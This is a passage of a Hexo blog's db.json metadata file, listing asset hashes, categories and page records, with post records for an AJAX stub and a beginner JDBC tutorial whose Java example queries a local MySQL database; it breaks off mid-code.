ss/_common/scaffolding/tags/tags.styl","hash":"51d46fa3c7c6b691c61a2c2b0ac005c97cfbf72b","modified":1641562266293},{"_id":"themes/next/source/css/_common/scaffolding/tags/tabs.styl","hash":"3256e39f281f06751a1c0145d9806a0e56d68170","modified":1641562266293},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1641562266319},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1641562266321},{"_id":"source/images/avatar.PNG","hash":"ce6e9874ab64904ab8cb45291237e697b5447e2a","modified":1641562266130},{"_id":"public/search.xml","hash":"e5a8b876773821522a66c372063a7edbded5663d","modified":1642413683694},{"_id":"public/about/index.html","hash":"a830f0b123f58d39ebadb4d69e5f234a83c879b7","modified":1642413683694},{"_id":"public/categories/index.html","hash":"341571871b59e3533d3361b34d2e0812050b97dd","modified":1642413683694},{"_id":"public/resources/index.html","hash":"e887127cad404b346ac244e9c99d489b0135c751","modified":1642413683694},{"_id":"public/tags/index.html","hash":"e69855c72b3d9a7fe722b904719282d8dbe089d1","modified":1642413683694},{"_id":"public/2022/01/16/AJAX初步学习/index.html","hash":"e541cf289df22929df1d0638b802bc1872fcaff0","modified":1642413683694},{"_id":"public/2021/01/13/cmd修改编码为utf-8/index.html","hash":"dc0293223f653dbe66552bc621f1ce979db437a8","modified":1642413683694},{"_id":"public/archives/page/4/index.html","hash":"85a70a19bd36be430816a1b31787becbd61e9a8b","modified":1642413683694},{"_id":"public/archives/2021/page/3/index.html","hash":"50e9adb10c8655766825e8947f7779acd0c4964e","modified":1642413683694},{"_id":"public/archives/2021/01/index.html","hash":"0925c5ce119673f3594be3a8bd52d3626dfb9065","modified":1642413683694},{"_id":"public/archives/2021/12/page/2/index.html","hash":"cd9ac444bf8a79faf5c7e590593059622e57b342","modified":1642413683694},{"_id":"public/archives/2022/index.html","hash":"6863865fb3eee857b28fe09cb27497fd471fd4d9","modified":1642413683694},{"_id":"public/archives/2022/01/index.html","hash":"c3be7773be5fdb26afd500bb6b89a20d93d69852","modified":1642413683694},{"_id":"public/categories/java/index.html","hash":"1062dd11f97e615fab36680fabaabf35487dd09c","modified":1642413683694},{"_id":"public/categories/c/index.html","hash":"29ff180bcd5e8966d875bf9e08f97cb231db82b8","modified":1642413683694},{"_id":"public/categories/小技巧/index.html","hash":"4276f7db7bd0303e823bf8f3c6feba695d090809","modified":1642413683694},{"_id":"public/categories/linux/index.html","hash":"afd145e5f7b0543ec6140c77c6e5e8e279326d94","modified":1642413683694},{"_id":"public/categories/git/index.html","hash":"affbd98f59b3be37257338f4e189d1617b711dcb","modified":1642413683694},{"_id":"public/categories/hexo/index.html","hash":"555f74f7937473599120836434a46b648937c774","modified":1642413683694},{"_id":"public/categories/正则表达式/index.html","hash":"011fa9029f745c467779d232effb15dd54bee63d","modified":1642413683694},{"_id":"public/categories/扫描/index.html","hash":"b9946ce63fc6d1720c0a8ab25fd7ace4246f4e76","modified":1642413683694},{"_id":"public/categories/web/index.html","hash":"5d14c5fe077860432d291df25a59f958bdca2e7e","modified":1642413683694},{"_id":"public/categories/sqli/index.html","hash":"c8b8cad24152a538ee2233c8a43bed2b008ee42e","modified":1642413683694},{"_id":"public/categories/web基础/index.html","hash":"baf18cdcc3f2c9773cfba86f49d02a0661b03f31","modified":1642413683694},{"_id":"public/categories/xxe/index.html","hash":"35b17bce2b14dfb0740dd0755876a9ff79621c19","modified":1642413683694},{"_id":"public/categories/数据结构/index.html","hash":"52a294f4294b2b65ab9e1b0292ab6c9588fc4e25","modified":1642413683694},{"_id":"public/page/4/index.html","hash":"9d2b9d46a12c456b76328be5dd6bc24f775d63a0","modified":1642413683694},{"_id":"public/tags/java/index.html","hash":"a718d49df491127532e33e1807e43390246fbc3e","modified":1642413683694},{"_id":"public/tags/数据库/index.html","hash":"39ad96b638cceb532a2fe6a6b23a0e704bc535c6","modified":1642413683694},{"_id":"public/tags/c-异常处理/index.html","hash":"ccb75d5b7b99b5d74fe166818f510646bf1e4876","modified":1642413683694},{"_id":"public/tags/cmd/index.html","hash":"6dafac45e1c3f90c1047528dc28d0262880959cf","modified":1642413683694},{"_id":"public/tags/编码/index.html","hash":"ab3339b5baa411878430651f8ccb63569a525944","modified":1642413683694},{"_id":"public/tags/linux/index.html","hash":"c9ee5bcd9b66f55a12747a0b8586ffbd74bccbd5","modified":1642413683694},{"_id":"public/tags/centos/index.html","hash":"aedc1003b8ff159a3136ec77a68d81cf95cc7ae1","modified":1642413683694},{"_id":"public/tags/firwall/index.html","hash":"60e91d1f9722c6be8a4f050d7651f2c2fc5a2323","modified":1642413683694},{"_id":"public/tags/bash/index.html","hash":"cf74892ef0f3aecce486e6d081a40913a3642a7f","modified":1642413683694},{"_id":"public/tags/find/index.html","hash":"8b5006d5ac20536f6b3791dfc61f18eed710a809","modified":1642413683694},{"_id":"public/tags/git/index.html","hash":"cf2151ae07c7382d67f43eaf80bb0dc00d0fb5b9","modified":1642413683694},{"_id":"public/tags/github/index.html","hash":"37c345f0b8286d69ae8517d0755a9742b0b92202","modified":1642413683694},{"_id":"public/tags/hexo-Next主题搜索功能/index.html","hash":"5953ca65254a79ce17b876a9b7d34e5c97eae503","modified":1642413683694},{"_id":"public/tags/hexo/index.html","hash":"b9160585d4a7acb58cb9e5f3522fdccec042e333","modified":1642413683694},{"_id":"public/tags/github公钥设置/index.html","hash":"a52f4705a77742b9047e934f0a915f162cbcbde5","modified":1642413683694},{"_id":"public/tags/IDEA/index.html","hash":"5e816a2a6d93f9ff8eb06e483676e4a16324ed98","modified":1642413683694},{"_id":"public/tags/快捷键/index.html","hash":"bca733d760722e81dec5f792e2078ef5cf09a846","modified":1642413683694},{"_id":"public/tags/插件下载/index.html","hash":"232db98487e68384ebb16f0226c7296bf1e35300","modified":1642413683694},{"_id":"public/tags/小技巧/index.html","hash":"0c7bdc479a26cb1a227747b37f7bef818f2436c2","modified":1642413683694},{"_id":"public/tags/UI/index.html","hash":"73e7de414355db54e438f24761ef975146d0dcd9","modified":1642413683694},{"_id":"public/tags/java-web/index.html","hash":"3b20e52c9ab5708c111d51b7d45c721191fea9e5","modified":1642413683694},{"_id":"public/tags/javaWeb/index.html","hash":"f871eef57fe75f5856c561f68bfec1acc801d05c","modified":1642413683694},{"_id":"public/tags/reflection/index.html","hash":"b258482ab1161076eb04dec2ada5457f3694dca3","modified":1642413683694},{"_id":"public/tags/多线程/index.html","hash":"9a0c6ace3b351712a4ffdac8610682fa74f96ae8","modified":1642413683694},{"_id":"public/tags/正则表达式/index.html","hash":"7071ffb5e191d1ad432f50c016c87773d40f3fac","modified":1642413683694},{"_id":"public/tags/kail/index.html","hash":"26e6e975ab3645e7bff645ae6cb66948443845da","modified":1642413683694},{"_id":"public/tags/nmap/index.html","hash":"df6dc7dc94e3bc6d9714104c209f2c5cd8ffa0e4","modified":1642413683694},{"_id":"public/tags/端口扫描/index.html","hash":"7ae71c39461e11a87ad3779573a0aaef6188100f","modified":1642413683694},{"_id":"public/tags/hexo上传图片/index.html","hash":"0589391526486de09674c91795c82cb34b74d849","modified":1642413683694},{"_id":"public/tags/RCE/index.html","hash":"95b7fd310c3aecff5b2a829acbb1eb2e77b80b3d","modified":1642413683694},{"_id":"public/tags/php/index.html","hash":"c8bcb0ef77114aa61a5db68837b43162ce3a4a0a","modified":1642413683694},{"_id":"public/tags/sqli-labs/index.html","hash":"80b56ae03ea49195d71d4c0bc5f01fd4b032706c","modified":1642413683694},{"_id":"public/tags/xxe/index.html","hash":"800a354e2a030001f54604c2e0ba693a89e21946","modified":1642413683694},{"_id":"public/tags/ctf/index.html","hash":"3c7dae4bb7246b6d064cd60d56bf2abbc9179c3c","modified":1642413683694},{"_id":"public/tags/cpp-数据结构-二叉树/index.html","hash":"2bf76fa8298a052fa1ded02feecf9d6a6f4954c1","modified":1642413683694},{"_id":"public/tags/数据结构/index.html","hash":"2550aa81f9408bc3554e328d3abaa8461753ae84","modified":1642413683694},{"_id":"public/tags/c-c/index.html","hash":"33bfa0cb1f05c4c1527506698e37a94efd0ba15c","modified":1642413683694},{"_id":"public/tags/接口interface/index.html","hash":"2c0059efedbb76143b4074194da4ea88244c340c","modified":1642413683694},{"_id":"public/2022/01/17/javaWeb项目搭建subms/index.html","hash":"4c1f6d91553fe6ef11eafd0c7ab95bd8230d2c1b","modified":1642413683694},{"_id":"public/2022/01/17/JDBC/index.html","hash":"815e9a834066851212fda5441f37746779ec7351","modified":1642413683694},{"_id":"public/2022/01/11/java-web/index.html","hash":"72b18998b835b97a616131d9ca28e5fb06e43b69","modified":1642413683694},{"_id":"public/2022/01/11/java注解/index.html","hash":"ecb06260610c25238feda47e965d20d843836f18","modified":1642413683694},{"_id":"public/2022/01/11/java反射/index.html","hash":"c102bab41a2b2dea7b21cde76709c5aea7bd6e84","modified":1642413683694},{"_id":"public/2022/01/08/rce/index.html","hash":"16fe4b35b11883e4da25c8404db8a462527025fd","modified":1642413683694},{"_id":"public/2022/01/07/排序/index.html","hash":"5bb8559c6ee8ebbbd02d277d8e128835c2199aaa","modified":1642413683694},{"_id":"public/2022/01/01/idea插件下载慢怎么解决/index.html","hash":"d2014dbb78266a1c5de253106974e81848fbcb49","modified":1642413683694},{"_id":"public/2021/12/30/查找/index.html","hash":"acb03c7a778fa313f5d6a5226912e311aa5693d1","modified":1642413683694},{"_id":"public/2021/12/27/java-ui/index.html","hash":"241a6b9ef48d1619f9011917fa94f861e3548d3d","modified":1642413683694},{"_id":"public/2021/12/27/cSharp跨线程访问/index.html","hash":"13f4e3b36c54e684351f7b9f8719a0b3375e9dab","modified":1642413683694},{"_id":"public/2021/12/25/xxe题目/index.html","hash":"b8832d8e258c8723e080d93adf90f84bfe744e6e","modified":1642413683694},{"_id":"public/2021/12/24/xxe/index.html","hash":"bb4c9d1efa1a7fa00d88dc7194aaf6edd03c84d6","modified":1642413683694},{"_id":"public/2021/12/24/接口/index.html","hash":"10bb8bf426bec51efd70d8cef3d7307232b821ff","modified":1642413683694},{"_id":"public/2021/12/23/java多线程/index.html","hash":"6f23a734f1c172d666b04fd40c3ea03d17e960ac","modified":1642413683694},{"_id":"public/2021/12/13/idea快捷键总结/index.html","hash":"f9d077415d881aad90d90edf992beb251491c211","modified":1642413683694},{"_id":"public/2021/12/09/java正则语法表/index.html","hash":"d6bd08cc27da3379bbb8406f86f9c1a47b574e4f","modified":1642413683694},{"_id":"public/2021/12/06/java正则表达式/index.html","hash":"a5c0df644cb9c01e08dc85a376ee25f0bda5ec75","modified":1642413683694},{"_id":"public/2021/12/04/hexo的next主题配置搜索功能/index.html","hash":"e0d417e68d475224d1f043a3f0f8fd80b83070f2","modified":1642413683694},{"_id":"public/2021/12/04/二叉树遍历/index.html","hash":"ba9531c24fefe41459ba05da8ba902002631534e","modified":1642413683694},{"_id":"public/2021/12/04/git新建仓库/index.html","hash":"774f4d75e241c7eaea158c8dd630dfee0bbab4cc","modified":1642413683694},{"_id":"public/2021/12/04/hexo多设备操作/index.html","hash":"4c7102f477467e977ca3177ce30fd639ac2cda18","modified":1642413683694},{"_id":"public/2021/12/03/hexo的一些使用技巧/index.html","hash":"8e2e56954405b6df35417302efd71a4eb230392d","modified":1642413683694},{"_id":"public/2021/12/02/pic-hexo/index.html","hash":"1a6333ac2d8b9ac4cef9f88f44a32fd1b5632f78","modified":1642413683694},{"_id":"public/2021/12/02/sqli-labs/index.html","hash":"25cdccdcbcf2c9f2fc8d692056b59d1f239b9be7","modified":1642413683694},{"_id":"public/2021/01/13/nmap使用/index.html","hash":"9ea39179d3aa4c2de4790a65673fe08cdb152a80","modified":1642413683694},{"_id":"public/2021/01/13/centos7防火墙配置/index.html","hash":"b7536d8907b0398b52f9251d3319f9785c409451","modified":1642413683694},{"_id":"public/2021/01/13/find&grep/index.html","hash":"2fc518d40cd99e9acbf98e64933bc1d3978a49db","modified":1642413683694},{"_id":"public/2021/01/13/kali更新/index.html","hash":"5db9d4f9a432ef152c701b68a53182b1b0957f51","modified":1642413683694},{"_id":"public/archives/index.html","hash":"551720e14b92997707e2160bac56321f71218a91","modified":1642413683694},{"_id":"public/archives/page/2/index.html","hash":"e53814c4ac547bdac7ac1fa35142d38103832f48","modified":1642413683694},{"_id":"public/archives/page/3/index.html","hash":"31059bb01af714c9a24b6cd9e51ddd21f1b27f96","modified":1642413683694},{"_id":"public/archives/2021/index.html","hash":"23baa7a0cc3a5644717707c00ab6e5deda0606d0","modified":1642413683694},{"_id":"public/archives/2021/page/2/index.html","hash":"b63f98d957cdb8bf70dac24a28577309768bb5e1","modified":1642413683694},{"_id":"public/archives/2021/12/index.html","hash":"d17fc8bfdde437b9af2a03f2afc75badf19709c6","modified":1642413683694},{"_id":"public/index.html","hash":"a330a6502e72b6e428e8358c19ae65a1489d05b9","modified":1642413683694},{"_id":"public/page/2/index.html","hash":"b794e1fe07324837ccb464221599d16fdcb09afd","modified":1642413683694},{"_id":"public/page/3/index.html","hash":"62081bf5efc56f996d407af3ea4e699aacef6864","modified":1642413683694},{"_id":"public/images/algolia_logo.svg","hash":"45eeea0b5fba833e21e38ea10ed5ab385ceb4f01","modified":1642413683694},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1642413683694},{"_id":"public/images/avatar.gif","hash":"18c53e15eb0c84b139995f9334ed8522b40aeaf6","modified":1642413683694},{"_id":"public/images/cc-by-nc-nd.svg","hash":"bc3588c9b2d7c68830524783120ff6cf957cf668","modified":1642413683694},{"_id":"public/images/cc-by-nc-sa.svg","hash":"6f55543d1fb9cbc436c101d24f802dec7b41efc3","modified":1642413683694},{"_id":"public/images/cc-by-sa.svg","hash":"70c1535f43e54e5ff35ca81419e77e4c0c301398","modified":1642413683694},{"_id":"public/images/cc-zero.svg","hash":"9bfb52b2f63527a7049247bf00d44e6dc1170e7d","modified":1642413683694},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1642413683694},{"_id":"public/images/cc-by-nc.svg","hash":"6f076713fb9bf934aa2c1046bdf2cf2e37bc1eab","modified":1642413683694},{"_id":"public/images/cc-by-nd.svg","hash":"42cd73da328077ccc92f859bb8f3cf621b3484f8","modified":1642413683694},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1642413683694},{"_id":"public/images/cc-by.svg","hash":"e92a33c32d1dac8ed94849b2b4e6456e887efe70","modified":1642413683694},{"_id":"public/images/logo.svg","hash":"169f56fd82941591dad3abd734a50ec7259be950","modified":1642413683694},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"260bb01acd44d88dcb7f501a238ab968f86bef9e","modified":1642413683694},{"_id":"public/images/hexo多设备操作/image-20211204020927875.png","hash":"5ed71a6dfc472635d81389e8752125b773116cad","modified":1642413683694},{"_id":"public/CNAME","hash":"6d86e38fbd83aaa783734513fa52d4183eab9c07","modified":1642413683694},{"_id":"public/images/java-ui/image-20211227234154224.png","hash":"688f22bf5a9eb1a569327ac3b4615a31a7b68a42","modified":1642413683694},{"_id":"public/images/java-ui/image-20211227233144855.png","hash":"f50be974bae053a2bd14e0d9ad27db0960f7ee2c","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228001003287.png","hash":"243789f1cd50f0015cf5691aa57028856fd6fb77","modified":1642413683694},{"_id":"public/images/hexo多设备操作/image-20211204021049789.png","hash":"6e17c150b7397f094c65d8235b8f4cf9a14b05a6","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228001621601.png","hash":"00a1aee630177657fa82b2bab3c82b8981dcbf65","modified":1642413683694},{"_id":"public/images/java-ui/image-20211227235300734.png","hash":"dca56dfb404aa053ce54bbd009ca5d26215bc6f5","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228001504560.png","hash":"e84325211a216985ae74a006da669b37fb00a37f","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228132643288.png","hash":"03c5374ef59c9df9ebf1d670f66c8febd085f0d4","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228133823317.png","hash":"82caa5bb811a1a7227c88c9c241761541b2d50a6","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228135556932.png","hash":"1036e0e06f0f6392630ceb1c264763a23f805693","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228135034235.png","hash":"12328a0d67c147c6e3d17124e5e4a6468beb3e53","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228131636660.png","hash":"0cf6cca186260cd9d36ecfb4962a24e87d7da8d6","modified":1642413683694},{"_id":"public/images/java-ui/image-20211228141558056.png","hash":"4f45237bb626b882d63be29bfdd8cb0f2ff9dbdf","modified":1642413683694},{"_id":"public/images/java-ui/image-20211229002557142.png","hash":"2869a10b35f9660b6552bece3b06d056c44beade","modified":1642413683694},{"_id":"public/images/java-ui/image-20211229002852293.png","hash":"73e271a367e211898aea7b78b48b6d86886a2795","modified":1642413683694},{"_id":"public/images/hexo设置文章显示部分内容/image-20211205134957202.png","hash":"fa02e8afe74de5cfececded53627ca00872e5c67","modified":1642413683694},{"_id":"public/images/java多线程/01FCDCDC.png","hash":"3e950900f79ef718edc953c524bd1b1510d3a5b4","modified":1642413683694},{"_id":"public/images/java多线程/image-20211223234915498.png","hash":"99cac78401f5708a5f8011c9b5b14354a8e66f5b","modified":1642413683694},{"_id":"public/images/java多线程/image-20211224011547555.png","hash":"e6b0ab9fb494db318ac796908d666dab21eeb869","modified":1642413683694},{"_id":"public/images/java多线程/image-20211223233326400.png","hash":"9e4b55baeed3d535d95c0dd6fee67a7fa33a7ab4","modified":1642413683694},{"_id":"public/images/java多线程/image-20211226000301899.png","hash":"09430ab0257fe88d3900a87c65eccd6c1fc61a32","modified":1642413683694},{"_id":"public/images/java多线程/image-20211226000540093.png","hash":"3d8258469fa8a7f195373adb99891eb73448c650","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211207000454930.png","hash":"8a093c1f900cb643622c50553af4f73bab20a418","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211207000542796.png","hash":"615094096adae1b08e4c0a0f09ee72c9d78987f3","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211207001258292.png","hash":"e78eea0c973b54d2b73fdfa704baac2abfbdee03","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211207004834793.png","hash":"21756494da271c82114956a480f5270652283057","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211207234020782.png","hash":"afd7a823774bbe3d8501858406c76746a5f636a7","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211208235406173.png","hash":"95544398997f3912d220d576e4d6ff84779cbd8a","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211207233240147.png","hash":"326540a79ed4dd84a81c374bd6623a2f7515295f","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211209124141204.png","hash":"16f875431a698fbfe10c9a484000be0c4dd59836","modified":1642413683694},{"_id":"public/images/pic-hexo/image-20211202174113252.png","hash":"1f1f03152470e76c8db0f18bbdd64d0605ea0de6","modified":1642413683694},{"_id":"public/images/pic-hexo/image-20211202174427901.png","hash":"68102fadc84824820bb620b309c2b413f14930a2","modified":1642413683694},{"_id":"public/images/sqli-labs/2.png","hash":"c4a03e0b62b7138304bfd03deafe6e8a8a0f0e23","modified":1642413683694},{"_id":"public/images/pic-hexo/image-20211203001406102.png","hash":"29079d9414d7e8ea4bd9513d33455e32d1dc4e63","modified":1642413683694},{"_id":"public/images/sqli-labs/Image [1].png","hash":"9cc7f503ea9a2b0394f0129582055cd3071eba46","modified":1642413683694},{"_id":"public/images/sqli-labs/4.png","hash":"2ca359c39ba76b482a4d1adadf35c32c95a9cf51","modified":1642413683694},{"_id":"public/images/sqli-labs/Image.png","hash":"271a7d9dc66cdceca9ca1282af93c177f4953bb2","modified":1642413683694},{"_id":"public/images/接口/image-20211224182807208.png","hash":"0615a0ab365f2cb96f6f0d8cb8e922768ecf0642","modified":1642413683694},{"_id":"public/images/接口/image-20211224183152984.png","hash":"f1605f2592d239fbf00ad84f0aa4804c09092b16","modified":1642413683694},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1642413683694},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1642413683694},{"_id":"public/images/git新建仓库/image-20211204165449892.png","hash":"fd926fc3c06c4b4fda83076858eda875eb1654c4","modified":1642413683694},{"_id":"public/images/hexo多设备操作/image-20211204031522619.png","hash":"c2c8285c860e7c14eabc897963ce94a65e083dc7","modified":1642413683694},{"_id":"public/images/java正则表达式/image-20211207004146025.png","hash":"7a54653170ac447b43f613a152cdd4127d801b5d","modified":1642413683694},{"_id":"public/images/sqli-labs/1.png","hash":"e37442d4824475b6a769c36a4c7d74cf5b14434f","modified":1642413683694},{"_id":"public/images/sqli-labs/3.png","hash":"2ab595ca6ceb3462f08d70feef6d4f94dbc192a6","modified":1642413683694},{"_id":"public/images/xxe/image-20211225130238479.png","hash":"d80b37bf398307a7a1f4a4d0042f192b41f382e6","modified":1642413683694},{"_id":"public/images/查找/image-20211231011652431.png","hash":"d7b7a2ecef8d894b79b5f9c7389b6d2e7a9db91b","modified":1642413683694},{"_id":"public/js/algolia-search.js","hash":"498d233eb5c7af6940baf94c1a1c36fdf1dd2636","modified":1642413683694},{"_id":"public/js/bookmark.js","hash":"9734ebcb9b83489686f5c2da67dc9e6157e988ad","modified":1642413683694},{"_id":"public/js/motion.js","hash":"72df86f6dfa29cce22abeff9d814c9dddfcf13a9","modified":1642413683694},{"_id":"public/js/local-search.js","hash":"35ccf100d8f9c0fd6bfbb7fa88c2a76c42a69110","modified":1642413683694},{"_id":"public/js/next-boot.js","hash":"a1b0636423009d4a4e4cea97bcbf1842bfab582c","modified":1642413683694},{"_id":"public/js/utils.js","hash":"730cca7f164eaf258661a61ff3f769851ff1e5da","modified":1642413683694},{"_id":"public/js/schemes/muse.js","hash":"1eb9b88103ddcf8827b1a7cbc56471a9c5592d53","modified":1642413683694},{"_id":"public/js/schemes/pisces.js","hash":"0ac5ce155bc58c972fe21c4c447f85e6f8755c62","modified":1642413683694},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1642413683694},{"_id":"public/css/main.css","hash":"36b048ac377acc25b92ac91a1fd3c9457e5242ed","modified":1642413683694},{"_id":"public/lib/anime.min.js","hash":"47cb482a8a488620a793d50ba8f6752324b46af3","modified":1642413683694},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1642413683694},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"0038dc97c79451578b7bd48af60ba62282b4082b","modified":1642413683694},{"_id":"public/images/cSharp跨线程访问/image-20211227162712864.png","hash":"f6cc385994156a4dc2854ad0f65c4a6513c60956","modified":1642413683694},{"_id":"public/images/查找/image-20211230163613538.png","hash":"3216e781745ed76ed84789c35798662ea1b0667c","modified":1642413683694},{"_id":"public/images/java多线程/image-20211225234147135.png","hash":"d9f676be3a879476e86fb48630f9a4cb809bba5c","modified":1642413683694},{"_id":"public/images/java多线程/image-20211225234222781.png","hash":"949c35c5283523da11070842f6e58906ff4eb93e","modified":1642413683694},{"_id":"public/images/查找/image-20211230172538718.png","hash":"8337eb6a4b07d5ccaa713f5256c0d15c8ee4710a","modified":1642413683694},{"_id":"public/images/avatar.PNG","hash":"ce6e9874ab64904ab8cb45291237e697b5447e2a","modified":1642413683694}],"Category":[{"name":"java","_id":"ckyiip9lx0006gsw9db52h9sn"},{"name":"c#","_id":"ckyiip9m2000cgsw90wup4vsv"},{"name":"小技巧","_id":"ckyiip9m5000hgsw9g40k8ov9"},{"name":"linux","_id":"ckyiip9m9000ogsw99rrk251f"},{"name":"git","_id":"ckyiip9mg000zgsw9g59n0fp3"},{"name":"hexo","_id":"ckyiip9ml0019gsw90kwxcpcz"},{"name":"正则表达式","_id":"ckyiip9n6001tgsw9dekw7zj5"},{"name":"扫描","_id":"ckyiip9n90021gsw93gb12luv"},{"name":"web","_id":"ckyiip9nb0027gsw93laz2a5s"},{"name":"sqli","_id":"ckyiip9ne002ggsw94a6v3shd"},{"name":"web基础","_id":"ckyiip9nf002ngsw97nfeg3jf"},{"name":"xxe","_id":"ckyiip9ng002sgsw9buzffpe5"},{"name":"数据结构","_id":"ckyiip9nh002ygsw9d6n5e6rj"}],"Data":[],"Page":[{"title":"about","date":"2021-12-02T07:31:15.000Z","_content":"\n祝你今天开心陌生人\n\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2021-12-02 15:31:15\n---\n\n祝你今天开心陌生人\n\n","updated":"2022-01-08T15:21:23.040Z","path":"about/index.html","comments":1,"layout":"page","_id":"ckyiip9lm0000gsw902jzhayb","content":"<p>祝你今天开心陌生人</p>\n","site":{"data":{}},"excerpt":"","more":"<p>祝你今天开心陌生人</p>\n"},{"title":"categories","date":"2021-12-02T07:26:36.000Z","type":"categories","layout":"tags","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2021-12-02 15:26:36\ntype: \"categories\"\nlayout: tags\ncomments: false\n---\n","updated":"2022-01-07T13:31:06.125Z","path":"categories/index.html","_id":"ckyiip9ls0002gsw9bbbcak4v","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"resources","date":"2021-12-02T07:45:46.000Z","type":"resources","comments":0,"_content":"","source":"resources/index.md","raw":"---\ntitle: resources\ndate: 2021-12-02 15:45:46\ntype: \"resources\"\ncomments: false\n---\n","updated":"2022-01-07T13:31:06.175Z","path":"resources/index.html","layout":"page","_id":"ckyiip9lv0004gsw94jibbz00","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2021-12-02T07:28:48.000Z","type":"tags","layout":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2021-12-02 15:28:48\ntype: \"tags\"\nlayout: tags\ncomments: false\n---\n","updated":"2022-01-07T13:31:06.175Z","path":"tags/index.html","_id":"ckyiip9lz0008gsw97ovketgo","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"AJAX初步学习","date":"2022-01-16T05:36:35.000Z","_content":"\n## AJAX\n\najax=Asynchronous JavaScript and XML(异步的javascript 和 XML)\n\najax是一种在无需重新加载整个网页的情况下,能够更新部分网页的技术,最经典的应用就是搜索引擎搜索框的搜索推荐\n\n增强B/S的体验性\n\n待续.............................\n","source":"_posts/AJAX初步学习.md","raw":"---\ntitle: AJAX初步学习\ndate: 2022-01-16 13:36:35\ntags:\n---\n\n## AJAX\n\najax=Asynchronous JavaScript and XML(异步的javascript 和 XML)\n\najax是一种在无需重新加载整个网页的情况下,能够更新部分网页的技术,最经典的应用就是搜索引擎搜索框的搜索推荐\n\n增强B/S的体验性\n\n待续.............................\n","slug":"AJAX初步学习","published":1,"updated":"2022-01-17T08:53:54.993Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9lp0001gsw99krtej9z","content":"<h2 id=\"AJAX\"><a href=\"#AJAX\" class=\"headerlink\" title=\"AJAX\"></a>AJAX</h2><p>ajax=Asynchronous JavaScript and XML(异步的javascript 和 XML)</p>\n<p>ajax是一种在无需重新加载整个网页的情况下,能够更新部分网页的技术,最经典的应用就是搜索引擎搜索框的搜索推荐</p>\n<p>增强B/S的体验性</p>\n<p>待续………………………..</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"AJAX\"><a href=\"#AJAX\" class=\"headerlink\" title=\"AJAX\"></a>AJAX</h2><p>ajax=Asynchronous JavaScript and XML(异步的javascript 和 XML)</p>\n<p>ajax是一种在无需重新加载整个网页的情况下,能够更新部分网页的技术,最经典的应用就是搜索引擎搜索框的搜索推荐</p>\n<p>增强B/S的体验性</p>\n<p>待续………………………..</p>\n"},{"title":"JDBC","date":"2022-01-17T07:13:34.000Z","_content":"\n## JDBC\t\n\njava database connectivity\n\nJDBC保证了多种数据库不同操作的统一,(没有什么是加一层无法解决的哈哈哈)\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117151840559.png\" alt=\"image-20220117151840559\" style=\"zoom:80%;\" />\n\n需要jar包的支持:用maven导包失败了,最后手动导入了mysql的jar包\n\n![image-20220117154728636](https://gitee.com/blue_satchel/images/raw/master/image-20220117154728636.png)\n\n\n\n在IDEA中连接mysql数据库的时候记得设定时区timeZone为ShangHai\n\n##### 简单尝试\n\n![image-20220117155711276](https://gitee.com/blue_satchel/images/raw/master/image-20220117155711276.png)\n\n```java\npackage com.blue.test;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class testJdbc {\n    public static void main(String[] args) throws Exception{\n        //配置信息\n        //useUnicode=true&characterEncoding=utf-8解决中文乱码\n        String url=\"jdbc:mysql://localhost:3306/jdbc?useUnicode=true&characterEncoding=utf-8\";\n        String username=\"root\";\n        String password=\"root\";\n        //1.加载驱动,(通过反射)\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        //2.连接数据库,代表数据表\n        Connection connection = DriverManager.getConnection(url,username,password);\n        //3.向数据库发送SQL的对象Statement\n        //此处可以使用PreparedStatement预编译,防止sql注入\n        Statement statement= connection.createStatement();\n        //4.编写sql\n        String sql=(\"select * from users\");\n        //5.执行sql,execute的选择根据要执行的操作而异\n        //增删改都使用executeUpdate(sql)\n        ResultSet resultSet = statement.executeQuery(sql);//返回一个resultSet\n        while 